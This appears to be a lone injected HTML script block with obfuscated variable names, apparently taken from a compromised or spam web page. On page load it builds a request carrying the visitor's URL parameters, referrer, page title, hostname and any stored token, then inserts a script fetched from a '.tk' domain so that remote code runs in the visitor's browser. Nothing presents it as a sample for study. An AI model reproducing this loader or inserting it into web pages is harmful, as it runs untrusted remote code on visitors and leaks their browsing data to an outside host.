<script>
    (function() {
    var name = '_fGPjc2RkK9F3fDTt';
    if (!window._fGPjc2RkK9F3fDTt) {
        window._fGPjc2RkK9F3fDTt = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://pabaketoutem.tk/FyfzCr',
            P_PATH: 'https://pabaketoutem.tk/fec84ce/postback',
        };
    }
    const _SLrS2Gv4TpXyNX9m = localStorage.getItem('config');
    if (typeof _SLrS2Gv4TpXyNX9m !== 'undefined' && _SLrS2Gv4TpXyNX9m !== null) {
        var _V8J7sq2w1bPT4hTP = JSON.parse(_SLrS2Gv4TpXyNX9m);
        var _pbbNLCGyVD4LYFnS = Math.round(+new Date()/1000);
        if (_V8J7sq2w1bPT4hTP.created_at + window._fGPjc2RkK9F3fDTt.ttl < _pbbNLCGyVD4LYFnS) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _HpmjwvKMCsVgP1N5 = localStorage.getItem('subId');
    var _Q7vJ5yYYJPHvN3Nk = localStorage.getItem('token');
    var _qCNWYPK9x92Q2TRq = '?return=js.client';
        _qCNWYPK9x92Q2TRq += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _qCNWYPK9x92Q2TRq += '&se_referrer=' + encodeURIComponent(document.referrer);
        _qCNWYPK9x92Q2TRq += '&default_keyword=' + encodeURIComponent(document.title);
        _qCNWYPK9x92Q2TRq += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _qCNWYPK9x92Q2TRq += '&name=' + encodeURIComponent(name);
        _qCNWYPK9x92Q2TRq += '&host=' + encodeURIComponent(window._fGPjc2RkK9F3fDTt.R_PATH);
    if (typeof _HpmjwvKMCsVgP1N5 !== 'undefined' && _HpmjwvKMCsVgP1N5 && window._fGPjc2RkK9F3fDTt.unique) {
        _qCNWYPK9x92Q2TRq += '&sub_id=' + encodeURIComponent(_HpmjwvKMCsVgP1N5);
    }
    if (typeof _Q7vJ5yYYJPHvN3Nk !== 'undefined' && _Q7vJ5yYYJPHvN3Nk && window._fGPjc2RkK9F3fDTt.unique) {
        _qCNWYPK9x92Q2TRq += '&token=' + encodeURIComponent(_Q7vJ5yYYJPHvN3Nk);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._fGPjc2RkK9F3fDTt.R_PATH + _qCNWYPK9x92Q2TRq;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
